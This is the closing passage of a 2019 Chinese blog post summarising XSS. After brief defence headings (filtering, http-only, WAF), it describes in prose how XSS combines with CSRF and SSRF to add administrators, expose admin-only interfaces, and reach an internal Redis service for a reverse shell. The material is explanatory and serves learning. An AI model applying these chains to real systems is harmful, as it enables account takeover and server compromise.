<h5 id="白名单和黑名单过滤"><a href="#白名单和黑名单过滤" class="headerlink" title="白名单和黑名单过滤"></a>白名单和黑名单过滤</h5><h5 id="设置http-only"><a href="#设置http-only" class="headerlink" title="设置http-only"></a>设置http-only</h5><h5 id="使用waf"><a href="#使用waf" class="headerlink" title="使用waf"></a>使用waf</h5><h2 id="0x06-组合拳"><a href="#0x06-组合拳" class="headerlink" title="0x06 组合拳"></a>0x06 组合拳</h2><h5 id="selfxss-csrf-》存储xss"><a href="#selfxss-csrf-》存储xss" class="headerlink" title="selfxss + csrf  ====》存储xss"></a>selfxss + csrf  ====》存储xss</h5><p>场景： 云笔记存在selfxss  但是可以csrf新建带有xss的云笔记，那么发送一个构造好的html可以直</p>
<p>接造成其他人的xss</p>
<h5 id="xss-csrf-》-xsrf"><a href="#xss-csrf-》-xsrf" class="headerlink" title="xss  +  csrf      ====》 xsrf"></a>xss  +  csrf      ====》 xsrf</h5><p>场景： csrf可以添加管理员，xss处插入csrf的js代码，导致管理员浏览了存在xss的页面直接创建了</p>
<p>管理员</p>
<h5 id="xss-csrf-》-未授权访问"><a href="#xss-csrf-》-未授权访问" class="headerlink" title="xss  +  csrf      ====》 未授权访问"></a>xss  +  csrf      ====》 未授权访问</h5><p>场景： 利用btoa(document.body.innerHTML)读取管理员网站的html  得到一个只有管理员可以看</p>
<p>到的接口，导致了接口的未授权访问</p>
<h5 id="xss-ssrf-》-RCE"><a href="#xss-ssrf-》-RCE" class="headerlink" title="xss  +  ssrf     ====》 RCE"></a>xss  +  ssrf     ====》 RCE</h5><p>场景： 只有管理员可以访问read.php同时该php存在ssrf漏洞，利用XMLHttpRequest()模拟ajax请</p>
<p>求使管理员通过ajax请求read.php攻击内网redis服务反弹shell</p>
<h2 id="0x07-referer"><a href="#0x07-referer" class="headerlink" title="0x07 referer"></a>0x07 referer</h2><p><a href="https://hwhxy.github.io/vulnerability_mining/2018/10/08/XSS%E4%B8%93%E6%A0%8F/#1211-innerhtmloutput" target="_blank" rel="noopener">HWHXY大佬XSS专栏</a></p>
<p><a href="https://xz.aliyun.com/t/2936#toc-41" target="_blank" rel="noopener">XSS小结</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>comical</div>
      <div>2019-04-25</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/web/">web</a>

      <a class="tag-link" href="/tags/xss/" rel="tag">#xss</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
